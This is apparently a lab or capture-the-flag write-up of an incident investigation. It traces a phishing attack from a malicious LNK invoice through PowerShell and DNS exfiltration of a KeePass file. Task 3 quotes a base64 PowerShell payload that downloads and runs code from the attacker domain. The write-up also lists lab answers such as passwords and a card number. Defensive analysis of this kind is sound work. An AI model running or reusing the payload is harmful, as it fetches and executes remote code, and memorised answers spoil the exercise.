# Boogeyman 1

## Overview

Boogeyman 1 is the second capstone challenge in the SOC Level 1 path, simulating a full incident response investigation into a targeted phishing attack against the finance team at Quick Logistics LLC. Attributed to a new threat group known as Boogeyman, the attack begins with a malicious LNK attachment disguised as an invoice and progresses through PowerShell-based endpoint compromise, sensitive data access, and DNS-based exfiltration. The investigation draws on email forensics, PowerShell log analysis, and packet capture analysis to reconstruct the full attack chain.

## Task 2 - Investigation Platform and Artefacts

Set up the investigation environment and reviewed the three provided artefacts: a phishing email (dump.eml), PowerShell logs from the victim's workstation (powershell.json, extracted from EVTX via evtx2json), and a packet capture (capture.pcapng). Reviewed the available toolset: Thunderbird for email analysis, LNKParse3 for parsing the malicious shortcut file, Wireshark/Tshark for packet analysis, and jq for querying the JSON-formatted PowerShell logs.

## Task 3 - The Boogeyman Is Here! (Email and Attachment Analysis)

Analyzed the phishing email (dump.eml) targeting Julianne, a finance employee, disguised as a follow-up invoice email from a legitimate business partner (B Packaging Inc). Identified the sender and victim email addresses, the third-party mail relay service used to add legitimacy and bypass spam filters, and extracted the password-protected attachment. Used LNKParse3 to analyze the malicious LNK file's Command Line Arguments field, revealing a base64-encoded PowerShell payload as the starting point of the compromise.

**Findings:**

```
Email address used to send the phishing email: agriffin@bpakcaging.xyz
Email address of the victim: julianne.westcott@hotmail.com
Third-party mail relay service (DKIM/List-Unsubscribe): Elastic Email
Name of the file inside the encrypted attachment: Invoice_20230103.lnk
Password of the encrypted attachment: Invoice2023!
Encoded payload in Command Line Arguments: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

![Task 3 answers](Screen%20Shot%202026-07-30%20at%2012.52.38%20AM.png)

## Task 4 - PowerShell Log Analysis (Endpoint Impact)

Used jq to parse and filter the JSON-formatted PowerShell logs, tracing the decoded payload's execution to identify the attacker's file hosting/C2 infrastructure, a downloaded enumeration tool, and the discovery and exfiltration of two sensitive files: a Microsoft Sticky Notes database and a KeePass password database.

Commands used:

```
cat powershell.json | jq
cat powershell.json | jq '.ScriptBlockText'
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'
```

**Findings:**

```
Domains used for file hosting and C2 (alphabetical): cdn.bpakcaging.xyz, files.bpakcaging.xyz
Enumeration tool downloaded by the attacker: Seatbelt
File accessed via sq3.exe: C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
Software that uses this file: Microsoft Sticky Notes
Name of the exfiltrated file: protected_data.kdbx
File type using the .kdbx extension: KeePass
Encoding used during exfiltration: hex
Tool used for exfiltration: nslookup
```

![Task 4 answers](Screen%20Shot%202026-07-30%20at%2012.54.18%20AM.png)

## Task 5 - Network Traffic Analysis

Correlated the PowerShell log findings against the packet capture using Wireshark and Tshark, confirming the C2 hosting software, the HTTP method used for command output, and the protocol used for exfiltration. Reconstructed the hex-encoded, DNS-exfiltrated KeePass database from individual DNS query subdomains, then opened the recovered file to retrieve the victim's stored credit card number.

Commands used:

```
tshark -r capture.pcapng -Y dns -T fields -e dns.qry.name | grep bpakcaging.xyz | cut -f1 -d '.' | grep -v -e "cdn" -e "files" | uniq | tr -c '\n' > extracted_file
```

**Findings:**

```
Software used to host the file/payload server: Python
HTTP method used by the C2 for command output: POST
Protocol used during the exfiltration activity: DNS
Password of the exfiltrated file: %p9^3!lL^Mz47E2GaT^y
Credit card number stored inside the exfiltrated file: 4024007128269551
```

![Task 5 answers](Screen%20Shot%202026-07-30%20at%2012.59.14%20AM.png)

## Full Attack Chain

1. **Initial Access** - Phishing email spoofing a legitimate business partner, using Elastic Email as a relay to add legitimacy
2. **Execution** - Password-protected malicious LNK attachment executes a base64-encoded PowerShell command
3. **C2 Establishment** - PowerShell reaches out to cdn.bpakcaging.xyz and files.bpakcaging.xyz, hosted on a Python-based server
4. **Discovery** - Seatbelt enumeration tool downloaded and executed to profile the compromised host
5. **Collection** - Attacker accesses Microsoft Sticky Notes' plum.sqlite database and a KeePass password database (protected_data.kdbx)
6. **Exfiltration** - protected_data.kdbx is hex-encoded and exfiltrated via DNS queries using nslookup
7. **Impact** - Attacker reconstructs the KeePass database offline and retrieves the victim's stored credit card number

## Key Takeaways

- Phishing infrastructure relies heavily on legitimacy signals to bypass both human suspicion and automated filters. A legitimate-sounding sender domain, correct SPF/DMARC alignment, and a reputable third-party mail relay (Elastic Email) all worked together to make this attack convincing enough to compromise a finance employee expecting a real invoice follow-up.
- LNK files remain a persistent Initial Access vector precisely because they can embed arbitrary command-line arguments while displaying a harmless-looking icon and file type, which is why parsing tools like LNKParse3 are essential for surfacing what a shortcut actually executes.
- DNS exfiltration is a deliberately quiet technique: encoding stolen data into DNS query subdomains blends malicious traffic with routine, expected DNS activity that's rarely inspected as closely as HTTP or FTP traffic, making tools like nslookup surprisingly effective exfiltration channels in the hands of an attacker.
- Correlating PowerShell logs with packet capture data was essential to fully reconstructing this incident. The PowerShell logs revealed what commands were run and how data was encoded, while the packet capture provided the actual bytes on the wire needed to physically reassemble the exfiltrated file.
- This investigation reinforces why password managers, even secure ones like KeePass, are only as safe as the endpoint they're stored on: once an attacker achieves code execution and can read arbitrary files, a locally stored password database becomes a single point of failure for every credential inside it, including sensitive financial data like a stored credit card number.
